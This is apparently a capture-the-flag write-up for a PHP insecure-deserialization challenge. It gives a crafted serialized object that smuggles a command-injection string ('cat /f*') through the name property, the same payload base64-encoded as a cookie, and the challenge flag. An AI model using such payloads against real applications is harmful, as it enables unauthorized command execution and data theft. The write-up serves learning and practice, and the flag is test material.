* Category
  * Unsecure Deserialization
  * PHP
  * Command Injection
* Solution
  1. Construct self-defined serialized object
  2. Insert payload to ```$this->name```
  3. Use ```'``` to jump out of first command and use ```;``` to concatenate multiple commands
     * Remember to append ```'``` at the end to close the ending ```'``` 
* Payload
  1. PAYLOAD = ```O:3:"Cat":1:{s:4:"name";s:11:"';cat /f*;'";}7.```
  2. cookie = ```TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czoxMToiJztjYXQgL2YqOyciO303Lg==```
* ```FLAG{d3serializable_c4t}```